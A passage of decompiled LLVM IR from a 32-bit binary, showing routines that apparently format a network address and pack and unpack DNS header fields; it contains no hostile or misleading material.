  %v9_8051b5e = icmp eq i32 %v0_8051b5e.pre, 6
  %v1_8051b61 = icmp eq i1 %v9_8051b5e, false
  br i1 %v1_8051b61, label %dec_label_pc_8051bb2, label %dec_label_pc_8051b63

dec_label_pc_8051b63:                             ; preds = %dec_label_pc_8051b5e
  %v0_8051b63 = load i32, i32* @edi, align 4
  %v1_8051b63 = icmp eq i32 %v0_8051b63, 0
  %v1_8051b65 = icmp eq i1 %v1_8051b63, false
  br i1 %v1_8051b65, label %dec_label_pc_8051bb2, label %dec_label_pc_8051b67

dec_label_pc_8051b67:                             ; preds = %dec_label_pc_8051b63
  %v0_8051b67 = load i32, i32* @ebp, align 4
  %v9_8051b67 = icmp eq i32 %v0_8051b67, 6
  br i1 %v9_8051b67, label %dec_label_pc_8051b7b, label %dec_label_pc_8051b6c

dec_label_pc_8051b6c:                             ; preds = %dec_label_pc_8051b67
  %v9_8051b6c = icmp eq i32 %v0_8051b67, 5
  %v1_8051b6f = icmp eq i1 %v9_8051b6c, false
  br i1 %v1_8051b6f, label %dec_label_pc_8051bb2, label %dec_label_pc_8051b71

dec_label_pc_8051b71:                             ; preds = %dec_label_pc_8051b6c
  br i1 %v1_8051b79, label %dec_label_pc_8051bb2, label %dec_label_pc_8051b7b

dec_label_pc_8051b7b:                             ; preds = %dec_label_pc_8051b71, %dec_label_pc_8051b67
  %v2_8051b81 = sub i32 %v1_8051b5d, %v2_8051b31
  store i32 %v2_8051b81, i32* @esi, align 4
  %v2_8051b8c = sub i32 46, %v2_8051b81
  store i32 %v2_8051b8c, i32* @ecx, align 4
  %v1_8051b8e = add i32 %arg2, 12
  store i32 %v1_8051b8e, i32* @eax, align 4
  store i32 %v1_8051b5d, i32* @edx, align 4
  %v0_8051b93 = load i32, i32* %stack_var_-124, align 4
  %v2_8051b93 = ptrtoint i8* %stack_var_-120.159 to i32
  %v4_8051b93 = call i32 @function_8051958(i32 %v0_8051b93, i32 %v2_8051b93, i32 %stack_var_-116.158)
  store i32 %v4_8051b93, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8051b9a = icmp eq i32 %v4_8051b93, 0
  br i1 %v1_8051b9a, label %dec_label_pc_8051c24, label %dec_label_pc_8051ba2

dec_label_pc_8051ba2:                             ; preds = %dec_label_pc_8051b7b
  %v0_8051ba5 = load i32, i32* @ebx, align 4
  store i32 %v0_8051ba5, i32* %stack_var_-124, align 4
  %v1_8051ba6 = inttoptr i32 %v0_8051ba5 to i8*
  %v2_8051ba6 = call i32 @function_804d1ac(i8* %v1_8051ba6)
  store i32 %v2_8051ba6, i32* %eax.global-to-local, align 4
  %v0_8051bae = load i32, i32* @ebx, align 4
  %v3_8051bae = add i32 %v0_8051bae, %v2_8051ba6
  store i32 %v3_8051bae, i32* @ebx, align 4
  %v0_8051bd6.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051bd6

dec_label_pc_8051bb2:                             ; preds = %dec_label_pc_8051b5e.thread, %dec_label_pc_8051b71, %dec_label_pc_8051b6c, %dec_label_pc_8051b63, %dec_label_pc_8051b5e
  %v1_8051bb350 = phi i32 [ 0, %dec_label_pc_8051b5e.thread ], [ %v0_8051b5e.pre, %dec_label_pc_8051b71 ], [ %v0_8051b5e.pre, %dec_label_pc_8051b6c ], [ %v0_8051b5e.pre, %dec_label_pc_8051b63 ], [ %v0_8051b5e.pre, %dec_label_pc_8051b5e ]
  %v0_8051bbc49 = phi i32 [ %v0_8051b5a60, %dec_label_pc_8051b5e.thread ], [ %v1_8051b5d, %dec_label_pc_8051b71 ], [ %v1_8051b5d, %dec_label_pc_8051b6c ], [ %v1_8051b5d, %dec_label_pc_8051b63 ], [ %v1_8051b5d, %dec_label_pc_8051b5e ]
  %v0_8051bb2 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8051bb2, i32* %stack_var_-112, align 4
  %v2_8051bb3 = mul i32 %v1_8051bb350, 4
  %v4_8051bb3 = add i32 %v3_8051bb3, %v2_8051bb3
  %v5_8051bb3 = inttoptr i32 %v4_8051bb3 to i32*
  %v6_8051bb3 = load i32, i32* %v5_8051bb3, align 4
  store i32 %v0_8051bbc49, i32* %stack_var_-124, align 4
  %v4_8051bbd = call i32 @function_804b8bc(i32 %v0_8051bbc49, i32 ptrtoint ([3 x i8]* @global_var_8054cb1.210 to i32), i32 %v6_8051bb3)
  store i32 %v4_8051bbd, i32* %eax.global-to-local, align 4
  %v0_8051bc5 = load i32, i32* @ebx, align 4
  %v2_8051bc5 = add i32 %v0_8051bc5, %v4_8051bbd
  store i32 %v2_8051bc5, i32* @ebx, align 4
  br label %dec_label_pc_8051bc7

dec_label_pc_8051bc7:                             ; preds = %dec_label_pc_8051b4c, %dec_label_pc_8051b50, %dec_label_pc_8051bb2
  %stack_var_-116.0 = phi i32 [ %v6_8051bb3, %dec_label_pc_8051bb2 ], [ %stack_var_-116.158, %dec_label_pc_8051b4c ], [ %stack_var_-116.158, %dec_label_pc_8051b50 ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8054cb1.210, i32 0, i32 0), %dec_label_pc_8051bb2 ], [ %stack_var_-120.159, %dec_label_pc_8051b4c ], [ %stack_var_-120.159, %dec_label_pc_8051b50 ]
  %v0_8051b5018 = phi i32 [ %v2_8051bc5, %dec_label_pc_8051bb2 ], [ %v0_8051b5a60, %dec_label_pc_8051b4c ], [ %v1_8051b53, %dec_label_pc_8051b50 ]
  %v0_8051bc7 = load i32, i32* @esi, align 4
  %v1_8051bc7 = add i32 %v0_8051bc7, 1
  %v0_8051bd1.pre = load i32, i32* @edi, align 4
  store i32 %v1_8051bc7, i32* @esi, align 4
  %v7_8051bcb = icmp sgt i32 %v1_8051bc7, 7
  %v10_8051bd1 = icmp eq i32 %v0_8051bd1.pre, -1
  br i1 %v7_8051bcb, label %dec_label_pc_8051bd1, label %dec_label_pc_8051b3c

dec_label_pc_8051bd1:                             ; preds = %dec_label_pc_8051bc7
  br i1 %v10_8051bd1, label %dec_label_pc_8051be2, label %dec_label_pc_8051bd6

dec_label_pc_8051bd6:                             ; preds = %dec_label_pc_8051bd1, %dec_label_pc_8051ba2
  %v0_8051bde = phi i32 [ %v0_8051b5018, %dec_label_pc_8051bd1 ], [ %v3_8051bae, %dec_label_pc_8051ba2 ]
  %v0_8051bd6 = phi i32 [ %v0_8051bd1.pre, %dec_label_pc_8051bd1 ], [ %v0_8051bd6.pre, %dec_label_pc_8051ba2 ]
  %v1_8051bd6 = load i32, i32* @ebp, align 4
  %v2_8051bd6 = add i32 %v1_8051bd6, %v0_8051bd6
  store i32 %v2_8051bd6, i32* %eax.global-to-local, align 4
  %v9_8051bd9 = icmp eq i32 %v2_8051bd6, 8
  %v1_8051bdc = icmp eq i1 %v9_8051bd9, false
  br i1 %v1_8051bdc, label %dec_label_pc_8051be2, label %dec_label_pc_8051bde

dec_label_pc_8051bde:                             ; preds = %dec_label_pc_8051bd6
  %v1_8051bde = inttoptr i32 %v0_8051bde to i8*
  store i8 58, i8* %v1_8051bde, align 1
  %v0_8051be1 = load i32, i32* @ebx, align 4
  %v1_8051be1 = add i32 %v0_8051be1, 1
  store i32 %v1_8051be1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051be2

dec_label_pc_8051be2:                             ; preds = %dec_label_pc_8051bd6, %dec_label_pc_8051bd1, %dec_label_pc_8051bde
  %v0_8051be6 = phi i32 [ %v0_8051bde, %dec_label_pc_8051bd6 ], [ %v0_8051b5018, %dec_label_pc_8051bd1 ], [ %v1_8051be1, %dec_label_pc_8051bde ]
  store i32 %v2_8051b31, i32* %edx.global-to-local, align 4
  %v1_8051be6 = add i32 %v0_8051be6, 1
  store i32 %v1_8051be6, i32* %eax.global-to-local, align 4
  %v1_8051be9 = inttoptr i32 %v0_8051be6 to i8*
  store i8 0, i8* %v1_8051be9, align 1
  %v0_8051bec = load i32, i32* %eax.global-to-local, align 4
  %v1_8051bec = load i32, i32* %edx.global-to-local, align 4
  %v2_8051bec = sub i32 %v0_8051bec, %v1_8051bec
  store i32 %v2_8051bec, i32* @eax, align 4
  %tmp74 = icmp ugt i32 %v2_8051bec, %arg4
  br i1 %tmp74, label %dec_label_pc_8051bf4, label %dec_label_pc_8051c01

dec_label_pc_8051bf4:                             ; preds = %dec_label_pc_8051be2
  %v0_8051bf4 = load i32, i32* %stack_var_-124, align 4
  %v1_8051bf4 = call i32 @function_804b774(i32 %v0_8051bf4)
  store i32 %v1_8051bf4, i32* %eax.global-to-local, align 4
  %v1_8051bf9 = inttoptr i32 %v1_8051bf4 to i32*
  store i32 28, i32* %v1_8051bf9, align 4
  br label %dec_label_pc_8051c22

dec_label_pc_8051c01:                             ; preds = %dec_label_pc_8051be2
  %v0_8051c01 = load i32, i32* @edi, align 4
  store i32 %v0_8051c01, i32* %stack_var_-112, align 4
  store i32 %arg3, i32* %stack_var_-124, align 4
  %v3_8051c0b = inttoptr i32 %arg3 to i8*
  %v4_8051c0b = call i32 @function_804d190(i8* %v3_8051c0b, i32 %v2_8051b31)
  store i32 %v4_8051c0b, i32* %eax.global-to-local, align 4
  store i32 %v4_8051c0b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051c24

dec_label_pc_8051c17:                             ; preds = %dec_label_pc_8051a70
  %v1_8051c17 = call i32 @function_804b774(i32 %v0_8051a63)
  store i32 %v1_8051c17, i32* %eax.global-to-local, align 4
  %v1_8051c1c = inttoptr i32 %v1_8051c17 to i32*
  store i32 97, i32* %v1_8051c1c, align 4
  br label %dec_label_pc_8051c22

dec_label_pc_8051c22:                             ; preds = %dec_label_pc_8051bf4, %dec_label_pc_8051c17
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051c24

dec_label_pc_8051c24:                             ; preds = %dec_label_pc_8051b7b, %dec_label_pc_8051c01, %dec_label_pc_8051a7b, %dec_label_pc_8051c22
  %v0_8051c27 = phi i32 [ 0, %dec_label_pc_8051b7b ], [ %v4_8051c0b, %dec_label_pc_8051c01 ], [ %v3_8051a87, %dec_label_pc_8051a7b ], [ 0, %dec_label_pc_8051c22 ]
  store i32 %v0_8051c27, i32* %eax.global-to-local, align 4
  store i32 %v0_8051a63, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051c27

; uselistorder directives
  uselistorder i32 %v0_8051c27, { 1, 0 }
  uselistorder i32 %v0_8051be6, { 1, 0 }
  uselistorder i32 %v1_8051bc7, { 1, 0, 2 }
  uselistorder i32 %v0_8051bbc49, { 1, 0 }
  uselistorder i32 %v0_8051b5e.pre, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8051b5d, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %stack_var_-116.158, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.159, { 2, 1, 0 }
  uselistorder i32 %v0_8051b5a60, { 2, 3, 1, 0 }
  uselistorder i32 %v1_8051b4c61, { 2, 0, 1 }
  uselistorder i32 %v0_8051b5662, { 2, 1, 0, 3 }
  uselistorder i32 %v2_8051b31, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_8051b29, { 1, 0 }
  uselistorder i32 %v0_8051b29, { 1, 2, 0 }
  uselistorder i32 %v1_8051b0c, { 0, 2, 1 }
  uselistorder i32 %v0_8051afc8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8051b0712, { 0, 2, 1, 3 }
  uselistorder i1 %v10_8051af7, { 1, 0 }
  uselistorder i32 %v0_8051b2264, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8051b1765, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8051b0c67, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_8051ac768, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_8051a63, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-124, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 5, 4, 2, 6, 3, 7 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 13, 8, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 97, { 1, 2, 0 }
  uselistorder i32 (i8*, i32)* @function_804d190, { 0, 3, 1, 2, 4, 5 }
  uselistorder [3 x i8]* @global_var_8054cb1.210, { 1, 0 }
  uselistorder i8 58, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 65535, { 1, 0, 3, 2 }
  uselistorder i32 64, { 5, 2, 0, 3, 4, 6, 1 }
  uselistorder i32* @esp, { 0, 1, 30, 31, 32, 33, 34, 35, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 15, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 11, 92, 93, 94, 12, 95, 9, 96, 97, 98, 99, 100, 101, 13, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 10, 115, 116, 117, 118, 119, 120, 14, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 155, 2, 3, 194, 4, 5, 16, 156, 157, 158, 159, 17, 160, 161, 162, 163, 164, 19, 165, 166, 167, 21, 168, 22, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 20, 181, 23, 182, 183, 184, 24, 185, 186, 187, 188, 189, 190, 191, 192, 18, 193, 41, 8, 36, 27, 37, 38, 26, 39, 40, 42, 43, 44, 45, 6, 46, 47, 48, 49, 25, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 28, 152, 7, 153, 154, 29 }
  uselistorder i32 15, { 0, 1, 3, 2 }
  uselistorder i32 60, { 7, 8, 4, 9, 10, 6, 0, 1, 3, 2, 5 }
  uselistorder i64 4294967296, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 15, 14 }
  uselistorder i32 (i8*, i32, i32)* @function_804d178, { 6, 3, 4, 5, 8, 12, 10, 11, 9, 0, 1, 2, 7 }
  uselistorder i32 (i32, i32, i32)* @function_8051958, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8051c24, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_8051c22, { 1, 0 }
  uselistorder label %dec_label_pc_8051be2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051bc7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051bb2, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8051b3c, { 1, 0 }
  uselistorder label %dec_label_pc_8051b31, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051b24, { 1, 0 }
  uselistorder label %dec_label_pc_8051b20, { 1, 0 }
  uselistorder label %dec_label_pc_8051b0c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051b09, { 1, 0 }
  uselistorder label %dec_label_pc_8051adf, { 1, 0 }
}

define i32 @function_8051c30() local_unnamed_addr {
dec_label_pc_8051c30:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_1()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8051c31 = load i32, i32* @ebx, align 4
  store i32 %v0_8051c31, i32* %stack_var_-8, align 4
  store i32 %tmp6, i32* %ebx.global-to-local, align 4
  %v4_8051c39 = ptrtoint i8* %tmp5 to i32
  store i32 %v4_8051c39, i32* %esi.global-to-local, align 4
  %v7_8051c42 = icmp sgt i32 %tmp, 11
  br i1 %v7_8051c42, label %dec_label_pc_8051c48, label %dec_label_pc_8051cde

dec_label_pc_8051c48:                             ; preds = %dec_label_pc_8051c30
  %v1_8051c48 = add i32 %tmp6, 1
  %v2_8051c48 = inttoptr i32 %v1_8051c48 to i8*
  %v3_8051c48 = load i8, i8* %v2_8051c48, align 1
  store i8 %v3_8051c48, i8* %tmp5, align 1
  %v0_8051c4e = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051c4e = inttoptr i32 %v0_8051c4e to i32*
  %v2_8051c4e = load i32, i32* %v1_8051c4e, align 4
  %v1_8051c50 = trunc i32 %v2_8051c4e to i8
  %v2_8051c50 = load i32, i32* %esi.global-to-local, align 4
  %v3_8051c50 = add i32 %v2_8051c50, 1
  %v4_8051c50 = inttoptr i32 %v3_8051c50 to i8*
  store i8 %v1_8051c50, i8* %v4_8051c50, align 1
  %v0_8051c76 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051c76 = add i32 %v0_8051c76, 8
  %v2_8051c76 = inttoptr i32 %v1_8051c76 to i32*
  %v3_8051c76 = load i32, i32* %v2_8051c76, align 4
  %v1_8051c79 = mul i32 %v3_8051c76, 8
  %v2_8051c7f = or i32 %v1_8051c79, 4
  %v1_8051c81 = add i32 %v0_8051c76, 20
  %v2_8051c81 = inttoptr i32 %v1_8051c81 to i32*
  %v3_8051c81 = load i32, i32* %v2_8051c81, align 4
  %v4_8051c81 = icmp eq i32 %v3_8051c81, 0
  %v1_8051c85 = icmp eq i1 %v4_8051c81, false
  %v2_8051c85 = zext i1 %v1_8051c85 to i32
  %v2_8051c88 = or i32 %v2_8051c85, %v2_8051c7f
  %v2_8051c8a = or i32 %v2_8051c88, -126
  %v5_8051c8a = trunc i32 %v2_8051c8a to i8
  store i32 %v2_8051c8a, i32* @ecx, align 4
  %v2_8051c8c = load i32, i32* %esi.global-to-local, align 4
  %v3_8051c8c = add i32 %v2_8051c8c, 2
  %v4_8051c8c = inttoptr i32 %v3_8051c8c to i8*
  store i8 %v5_8051c8a, i8* %v4_8051c8c, align 1
  %v0_8051c8f = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051c95 = add i32 %v0_8051c8f, 28
  %v2_8051c95 = inttoptr i32 %v1_8051c95 to i8*
  %v3_8051c95 = load i8, i8* %v2_8051c95, align 1
  %tmp10 = urem i8 %v3_8051c95, 16
  %v2_8051ca0 = or i8 %tmp10, -128
  %v2_8051ca2 = load i32, i32* %esi.global-to-local, align 4
  %v3_8051ca2 = add i32 %v2_8051ca2, 3
  %v4_8051ca2 = inttoptr i32 %v3_8051ca2 to i8*
  store i8 %v2_8051ca0, i8* %v4_8051ca2, align 1
  %v0_8051ca5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051ca5 = add i32 %v0_8051ca5, 33
  %v2_8051ca5 = inttoptr i32 %v1_8051ca5 to i8*
  %v3_8051ca5 = load i8, i8* %v2_8051ca5, align 1
  %v2_8051ca9 = load i32, i32* %esi.global-to-local, align 4
  %v3_8051ca9 = add i32 %v2_8051ca9, 4
  %v4_8051ca9 = inttoptr i32 %v3_8051ca9 to i8*
  store i8 %v3_8051ca5, i8* %v4_8051ca9, align 1
  %v0_8051cac = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051cac = add i32 %v0_8051cac, 32
  %v2_8051cac = inttoptr i32 %v1_8051cac to i32*
  %v3_8051cac = load i32, i32* %v2_8051cac, align 4
  %v1_8051caf = trunc i32 %v3_8051cac to i8
  %v2_8051caf = load i32, i32* %esi.global-to-local, align 4
  %v3_8051caf = add i32 %v2_8051caf, 5
  %v4_8051caf = inttoptr i32 %v3_8051caf to i8*
  store i8 %v1_8051caf, i8* %v4_8051caf, align 1
  %v0_8051cb2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051cb2 = add i32 %v0_8051cb2, 37
  %v2_8051cb2 = inttoptr i32 %v1_8051cb2 to i8*
  %v3_8051cb2 = load i8, i8* %v2_8051cb2, align 1
  %v2_8051cb6 = load i32, i32* %esi.global-to-local, align 4
  %v3_8051cb6 = add i32 %v2_8051cb6, 6
  %v4_8051cb6 = inttoptr i32 %v3_8051cb6 to i8*
  store i8 %v3_8051cb2, i8* %v4_8051cb6, align 1
  %v0_8051cb9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051cb9 = add i32 %v0_8051cb9, 36
  %v2_8051cb9 = inttoptr i32 %v1_8051cb9 to i32*
  %v3_8051cb9 = load i32, i32* %v2_8051cb9, align 4
  %v1_8051cbc = trunc i32 %v3_8051cb9 to i8
  %v2_8051cbc = load i32, i32* %esi.global-to-local, align 4
  %v3_8051cbc = add i32 %v2_8051cbc, 7
  %v4_8051cbc = inttoptr i32 %v3_8051cbc to i8*
  store i8 %v1_8051cbc, i8* %v4_8051cbc, align 1
  %v0_8051cbf = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051cbf = add i32 %v0_8051cbf, 41
  %v2_8051cbf = inttoptr i32 %v1_8051cbf to i8*
  %v3_8051cbf = load i8, i8* %v2_8051cbf, align 1
  %v2_8051cc3 = load i32, i32* %esi.global-to-local, align 4
  %v3_8051cc3 = add i32 %v2_8051cc3, 8
  %v4_8051cc3 = inttoptr i32 %v3_8051cc3 to i8*
  store i8 %v3_8051cbf, i8* %v4_8051cc3, align 1
  %v0_8051cc6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051cc6 = add i32 %v0_8051cc6, 40
  %v2_8051cc6 = inttoptr i32 %v1_8051cc6 to i32*
  %v3_8051cc6 = load i32, i32* %v2_8051cc6, align 4
  %v1_8051cc9 = trunc i32 %v3_8051cc6 to i8
  %v2_8051cc9 = load i32, i32* %esi.global-to-local, align 4
  %v3_8051cc9 = add i32 %v2_8051cc9, 9
  %v4_8051cc9 = inttoptr i32 %v3_8051cc9 to i8*
  store i8 %v1_8051cc9, i8* %v4_8051cc9, align 1
  %v0_8051ccc = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051ccc = add i32 %v0_8051ccc, 45
  %v2_8051ccc = inttoptr i32 %v1_8051ccc to i8*
  %v3_8051ccc = load i8, i8* %v2_8051ccc, align 1
  %v2_8051cd0 = load i32, i32* %esi.global-to-local, align 4
  %v3_8051cd0 = add i32 %v2_8051cd0, 10
  %v4_8051cd0 = inttoptr i32 %v3_8051cd0 to i8*
  store i8 %v3_8051ccc, i8* %v4_8051cd0, align 1
  %v0_8051cd3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051cd3 = add i32 %v0_8051cd3, 44
  %v2_8051cd3 = inttoptr i32 %v1_8051cd3 to i32*
  %v3_8051cd3 = load i32, i32* %v2_8051cd3, align 4
  %v1_8051cd6 = trunc i32 %v3_8051cd3 to i8
  %v2_8051cd6 = load i32, i32* %esi.global-to-local, align 4
  %v3_8051cd6 = add i32 %v2_8051cd6, 11
  %v4_8051cd6 = inttoptr i32 %v3_8051cd6 to i8*
  store i8 %v1_8051cd6, i8* %v4_8051cd6, align 1
  %v2_8051cde.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8051cde

dec_label_pc_8051cde:                             ; preds = %dec_label_pc_8051c30, %dec_label_pc_8051c48
  %v2_8051cde = phi i32 [ %v0_8051c31, %dec_label_pc_8051c30 ], [ %v2_8051cde.pre, %dec_label_pc_8051c48 ]
  %v0_8051ce0 = phi i32 [ -1, %dec_label_pc_8051c30 ], [ 12, %dec_label_pc_8051c48 ]
  store i32 %v2_8051cde, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051ce0

; uselistorder directives
  uselistorder i32 45, { 3, 1, 4, 2, 0 }
  uselistorder i32 41, { 1, 0 }
  uselistorder i32 37, { 1, 0, 2 }
  uselistorder i32 33, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051cde, { 1, 0 }
}

define i32 @function_8051ce4() local_unnamed_addr {
dec_label_pc_8051ce4:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-4 = alloca i32, align 4
  %v0_8051ce4 = load i32, i32* @ebx, align 4
  store i32 %v0_8051ce4, i32* %stack_var_-4, align 4
  %v4_8051ce5 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_8051ce5, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_8051ced = load i8, i8* %tmp2, align 1
  %v3_8051ced = zext i8 %v2_8051ced to i32
  %v1_8051cf0 = add i32 %v4_8051ce5, 1
  %v2_8051cf0 = inttoptr i32 %v1_8051cf0 to i8*
  %v3_8051cf0 = load i8, i8* %v2_8051cf0, align 1
  %v4_8051cf0 = zext i8 %v3_8051cf0 to i32
  %v2_8051cf4 = mul nuw nsw i32 %v3_8051ced, 256
  %v2_8051cf7 = or i32 %v4_8051cf0, %v2_8051cf4
  %v2_8051cf9 = inttoptr i32 %tmp to i32*
  store i32 %v2_8051cf7, i32* %v2_8051cf9, align 4
  %v0_8051cfb = load i32, i32* @ecx, align 4
  %v1_8051cfb = add i32 %v0_8051cfb, 2
  %v2_8051cfb = inttoptr i32 %v1_8051cfb to i8*
  %v3_8051cfb = load i8, i8* %v2_8051cfb, align 1
  %tmp6 = icmp slt i8 %v3_8051cfb, 0
  %v2_8051cff = zext i1 %tmp6 to i32
  %v1_8051d02 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051d02 = add i32 %v1_8051d02, 4
  %v3_8051d02 = inttoptr i32 %v2_8051d02 to i32*
  store i32 %v2_8051cff, i32* %v3_8051d02, align 4
  %v0_8051d05 = load i32, i32* @ecx, align 4
  %v1_8051d05 = add i32 %v0_8051d05, 2
  %v2_8051d05 = inttoptr i32 %v1_8051d05 to i8*
  %v3_8051d05 = load i8, i8* %v2_8051d05, align 1
  %v3_8051d08 = udiv i8 %v3_8051d05, 8
  %tmp7 = urem i8 %v3_8051d08, 16
  %v1_8051d0b = zext i8 %tmp7 to i32
  %v1_8051d0e = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051d0e = add i32 %v1_8051d0e, 8
  %v3_8051d0e = inttoptr i32 %v2_8051d0e to i32*
  store i32 %v1_8051d0b, i32* %v3_8051d0e, align 4
  %v0_8051d11 = load i32, i32* @ecx, align 4
  %v1_8051d11 = add i32 %v0_8051d11, 2
  %v2_8051d11 = inttoptr i32 %v1_8051d11 to i8*
  %v3_8051d11 = load i8, i8* %v2_8051d11, align 1
  %div = udiv i8 %v3_8051d11, 4
  %tmp8 = urem i8 %div, 2
  %v1_8051d18 = zext i8 %tmp8 to i32
  %v1_8051d1b = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051d1b = add i32 %v1_8051d1b, 12
  %v3_8051d1b = inttoptr i32 %v2_8051d1b to i32*
  store i32 %v1_8051d18, i32* %v3_8051d1b, align 4
  %v0_8051d1e = load i32, i32* @ecx, align 4
  %v1_8051d1e = add i32 %v0_8051d1e, 2
  %v2_8051d1e = inttoptr i32 %v1_8051d1e to i8*
  %v3_8051d1e = load i8, i8* %v2_8051d1e, align 1
  %div5 = udiv i8 %v3_8051d1e, 2
  %tmp9 = urem i8 %div5, 2
  %v1_8051d24 = zext i8 %tmp9 to i32
  %v1_8051d27 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051d27 = add i32 %v1_8051d27, 16
  %v3_8051d27 = inttoptr i32 %v2_8051d27 to i32*
  store i32 %v1_8051d24, i32* %v3_8051d27, align 4
  %v0_8051d2a = load i32, i32* @ecx, align 4
  %v1_8051d2a = add i32 %v0_8051d2a, 2
  %v2_8051d2a = inttoptr i32 %v1_8051d2a to i8*
  %v3_8051d2a = load i8, i8* %v2_8051d2a, align 1
  %tmp10 = urem i8 %v3_8051d2a, 2
  %v1_8051d2e = zext i8 %tmp10 to i32
  %v1_8051d31 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051d31 = add i32 %v1_8051d31, 20
  %v3_8051d31 = inttoptr i32 %v2_8051d31 to i32*
  store i32 %v1_8051d2e, i32* %v3_8051d31, align 4
  %v0_8051d34 = load i32, i32* @ecx, align 4
  %v1_8051d34 = add i32 %v0_8051d34, 3
  %v2_8051d34 = inttoptr i32 %v1_8051d34 to i8*
  %v3_8051d34 = load i8, i8* %v2_8051d34, align 1
  %tmp11 = icmp slt i8 %v3_8051d34, 0
  %v2_8051d38 = zext i1 %tmp11 to i32
  %v1_8051d3b = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051d3b = add i32 %v1_8051d3b, 24
  %v3_8051d3b = inttoptr i32 %v2_8051d3b to i32*
  store i32 %v2_8051d38, i32* %v3_8051d3b, align 4
  %v0_8051d3e = load i32, i32* @ecx, align 4
  %v1_8051d3e = add i32 %v0_8051d3e, 3
  %v2_8051d3e = inttoptr i32 %v1_8051d3e to i8*
  %v3_8051d3e = load i8, i8* %v2_8051d3e, align 1
  %tmp12 = urem i8 %v3_8051d3e, 16
  %v1_8051d42 = zext i8 %tmp12 to i32
  %v1_8051d45 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051d45 = add i32 %v1_8051d45, 28
  %v3_8051d45 = inttoptr i32 %v2_8051d45 to i32*
  store i32 %v1_8051d42, i32* %v3_8051d45, align 4
  %v0_8051d48 = load i32, i32* @ecx, align 4
  %v1_8051d48 = add i32 %v0_8051d48, 4
  %v2_8051d48 = inttoptr i32 %v1_8051d48 to i8*
  %v3_8051d48 = load i8, i8* %v2_8051d48, align 1
  %v4_8051d48 = zext i8 %v3_8051d48 to i32
  %v1_8051d4c = add i32 %v0_8051d48, 5
  %v2_8051d4c = inttoptr i32 %v1_8051d4c to i8*
  %v3_8051d4c = load i8, i8* %v2_8051d4c, align 1
  %v4_8051d4c = zext i8 %v3_8051d4c to i32
